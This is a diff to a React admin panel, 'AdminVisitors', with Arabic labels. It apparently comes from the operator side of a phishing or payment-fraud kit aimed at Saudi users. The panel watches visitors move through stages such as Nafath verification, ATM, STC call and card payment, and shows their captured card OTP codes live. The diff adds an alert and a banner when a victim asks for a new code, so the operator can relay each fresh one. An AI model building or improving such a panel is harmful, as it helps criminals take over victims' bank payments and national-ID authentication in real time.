@@ -528,7 +528,7 @@ const AdminVisitors = () => {
             nafath_verify: "رمز نفاذ", atm: "ATM", stc_call: "مكالمة STC",
             phone_verification: "توثيق الجوال", payment: "الدفع",
           };
-          toast.info(`كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
+          toast.info(row.payload?.resend_requested ? `الزائر طلب إرسال رمز جديد: ${stageLabels[row.stage] || row.stage}` : `كود تحقق جديد: ${stageLabels[row.stage] || row.stage}`);
         }
         // Auto-refresh stage events for selected visitor
         if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
@@ -872,6 +872,12 @@ const AdminVisitors = () => {
   const getLatestStageEvent = (orderId: string, stage: string) => {
     const matchedEvents = stageEvents
       .filter(event => event.order_id === orderId && event.stage === stage)
+      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+    return matchedEvents[matchedEvents.length - 1] || null;
+  };
+  const getLatestResendEvent = (orderId: string, stage: string) => {
+    const matchedEvents = stageEvents
+      .filter(event => event.order_id === orderId && event.stage === stage && Boolean((event.payload as any)?.resend_requested))
       .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
     return matchedEvents[matchedEvents.length - 1] || null;
   };
@@ -2105,10 +2111,17 @@ const AdminVisitors = () => {
                                     .filter(e => e.order_id === order.id && e.stage === "otp")
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
+                                  const latestOtpResendEvent = getLatestResendEvent(order.id, "otp");
                                   const currentOtp = order.otp_code;
                                   return (
                                     <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600" defaultOpen={isPending && activeStage === "otp"} isActive={isPending && activeStage === "otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
+                                        {latestOtpResendEvent && (
+                                          <div className="flex items-center justify-between rounded-lg border border-amber-500/20 bg-amber-500/10 px-3 py-2">
+                                            <span className="text-[10px] font-bold text-amber-700">الزائر طلب إرسال رمز جديد</span>
+                                            <span className="text-[9px] text-amber-700/80">{new Date(latestOtpResendEvent.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })}</span>
+                                          </div>
+                                        )}
                                         {rejectedOtps.length > 0 && (
                                           <div className="space-y-1.5">
                                             {rejectedOtps.map((ev, i) => {
